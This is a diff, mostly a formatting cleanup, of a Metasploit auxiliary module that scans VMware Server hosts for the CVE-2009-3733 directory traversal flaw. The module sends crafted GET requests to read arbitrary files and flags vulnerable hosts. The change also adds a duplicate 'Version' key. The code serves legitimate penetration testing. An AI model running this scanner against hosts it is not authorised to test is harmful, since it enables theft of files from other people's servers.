@@ -1,5 +1,9 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -8,7 +12,7 @@
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
-	
+
 	# Exploit mixins should be called first
 	include Msf::Exploit::Remote::HttpClient
 	# Scanner mixin should be near last
@@ -18,18 +22,19 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'        => 'VMware Server Directory Transversal Vulnerability',
-			'Version'     => '$Revision:  $',
+			'Version'     => '$Revision$',
 			'Description' => 'This modules exploits the VMware Server Directory traversal vulnerability in VMware Server 1.x before 1.0.10 build 203137 and 2.x before 2.0.2 build 203138 on Linux, VMware ESXi 3.5, and VMware ESX 3.0.3 and 3.5 allows remote attackers to read arbitrary files. Common VMware server ports 80/8222 and 443/8333 SSL.  If you want to download the entire VM, check out the gueststealer tool.',
 			'Author'      => 'CG' ,
 			'License'     => MSF_LICENSE,
+			'Version'     => '$Revision$',
 			'References'	=>
 				[
 					[ 'URL', 'http://www.vmware.com/security/advisories/VMSA-2009-0015.html' ],
 					[ 'BID', '36842' ],
 					[ 'CVE', '2009-3733' ],
-					[ 'URL', 'http://fyrmassociates.com/tools/gueststealer-v1.1.pl']
-				]	
-		)		
+					[ 'URL', 'http://fyrmassociates.com/tools/gueststealer-v1.1.pl' ]
+				]
+		)
 		register_options(
 			[
 				Opt::RPORT(8222),
@@ -40,11 +45,11 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(target_host)
 
-		begin	
+		begin
 			file = datastore['FILE']
 			trav = datastore['TRAV']
 			res = send_request_raw({
-				'uri'          => trav+file, 
+				'uri'          => trav+file,
 				'version'      => '1.1',
 				'method'       => 'GET'
 						}, 25)
@@ -54,16 +59,16 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("#{target_host}:#{rport} appears vulnerable to VMWare Directory Traversal Vulnerability")
 				report_vuln(
 					:host   => target_host,
-                                        :port	=> rport,
+					:port	=> rport,
 					:proto	=> (ssl ? 'https' : 'http'),
-                                        :name   => 'VMWARE-DIRECTORY-TRAVERSAL',
-                                        :data   => res.code,
-                                        :refs   =>
-                                         [
-                                         	[ 'CVE', '2009-3733'],
-                                                [ 'BID', '36842'],
-                                         ]
-                                       )
+					:name   => 'VMWARE-DIRECTORY-TRAVERSAL',
+					:data   => res.code,
+					:refs   =>
+						[
+							[ 'CVE', '2009-3733'],
+							[ 'BID', '36842'],
+						]
+					)
 			else
 				''
 				#print_status("Received #{res.code} for #{trav}#{file}")
@@ -73,6 +78,5 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Timeout::Error, ::Errno::EPIPE
 		end
 	end
-	
-end
 
+end
